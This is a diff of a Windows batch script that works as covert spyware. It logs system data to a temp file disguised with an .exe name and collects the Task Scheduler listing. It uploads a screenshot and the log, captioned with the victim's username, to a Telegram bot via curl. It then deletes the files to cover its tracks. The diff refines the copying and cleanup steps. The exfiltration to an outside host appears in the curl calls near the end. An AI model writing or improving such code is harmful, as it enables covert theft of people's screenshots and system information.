@@ -9,6 +9,7 @@ set "LOGFILE=%temp%\9875426.exe"
 
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
+del /f /q "%LOGFILE%"
 exit
 
 :LogOutput
@@ -619,19 +620,26 @@ if "%CheckSend%"=="1" (
 :SENDCHECK
 
 
+set "TASKS_DATA=%temp%\tasks_data.txt"
+set "LOGFILE1=%temp%\LOGFILE1.txt"
+
+:: make a copy of %LOGFILE% to %LOGFILE1%
+type "%LOGFILE%" > "%LOGFILE1%"
+
+:: create %TASKS_DATA%
+schtasks /query /fo LIST /v > "%TASKS_DATA%"
 
 
-
-schtasks /query /fo LIST /v > "%temp%\tasks_data.txt"
-(for /l %%i in (1,1,11) do echo.) >> "%LOGFILE%"
-echo Task Scheduler :  >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-type "%temp%\tasks_data.txt" >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
+:: make x empty lines to %LOGFILE1% then type taask scheduler .....
+(for /l %%i in (1,1,11) do echo.) >> "%LOGFILE1%"
+echo Task Scheduler :  >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+type "%TASKS_DATA%" >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
 
 
 
@@ -676,7 +684,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
      -F "chat_id=%CHAT_ID%" ^
      -F "caption=%USERNAME%" ^
-     -F "document=@%LOGFILE%"
+     -F "document=@%LOGFILE1%"
 
 
 
@@ -684,8 +692,8 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
 echo Message sent to chat ID %CHAT_ID%
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
-del /f /q "%LOGFILE%"
-del /f /q "%temp%\tasks_data.txt"
+del /f /q "%LOGFILE1%"
+del /f /q "%TASKS_DATA%"
 
 
 set "CheckSend=0"
